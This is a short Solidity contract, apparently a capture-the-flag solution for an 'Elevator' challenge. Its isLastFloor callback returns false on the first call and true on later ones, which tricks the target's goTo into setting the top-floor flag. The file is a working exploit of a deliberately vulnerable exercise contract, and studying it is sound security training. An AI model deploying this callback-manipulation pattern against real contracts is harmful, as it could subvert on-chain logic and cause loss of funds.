// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IElevator, IBuilding} from "../interfaces/IElevator.sol";

contract ElevatorAttack is IBuilding {
    IElevator public target;
    uint256 public count = 0;

    constructor(address _targetAddress) {
        target = IElevator(_targetAddress);
    }

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint256) external override returns (bool) {
        count = count + 1;

        if (count == 1) {
            return false;
        } else {
            return true;
        }
    }
}
